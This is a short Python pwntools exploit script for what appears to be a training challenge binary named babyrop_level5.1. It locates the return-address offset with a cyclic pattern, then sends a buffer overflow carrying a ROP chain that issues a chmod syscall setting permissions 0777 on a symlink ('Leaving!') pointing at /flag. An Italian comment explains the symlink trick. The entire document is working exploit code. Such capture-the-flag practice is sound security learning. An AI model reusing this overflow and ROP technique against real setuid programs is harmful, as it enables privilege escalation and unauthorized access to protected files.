#!/usr/bin/python3
from pwn import *

# INITIALIZATION
context.arch = 'amd64'
context.log_level = 'CRITICAL'

# Load the ELF binary
elf = ELF('/challenge/babyrop_level5.1')
rop = ROP(elf)

## Calculating buffer length
# Create a process to determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))
io.wait()

# Find the offset where the cyclic pattern overwrites the return address
buffer_len = cyclic_find(io.corefile.fault_addr, n=8)
print(buffer_len)
## Crafting ROP Chain

io = elf.process()

# ROP chain to set the file permissions of the buffer to 0777
CHAIN = (
    p64(rop.rax.address) + p64(0x5A) +  # Set rax to the syscall number for chmod (0x5A)
    p64(rop.rdi.address) + p64(0x00402004) +  # Cremo symlin tramite ln -s /flag Leaving! così da avere l'inidirozzo di Leaving! su ghidra e modificare i permessi di quello che è linkato a /flag
    p64(rop.rsi.address) + p64(0o777) +  # Set rsi to the file permissions (0777)
    p64(rop.syscall.address)  # Make the syscall
)

# Construct the payload with the ROP chain
PAYLOAD = (b'A' * 104)  + CHAIN

# Send the payload to the binary
io.sendline(PAYLOAD)

io.interactive()
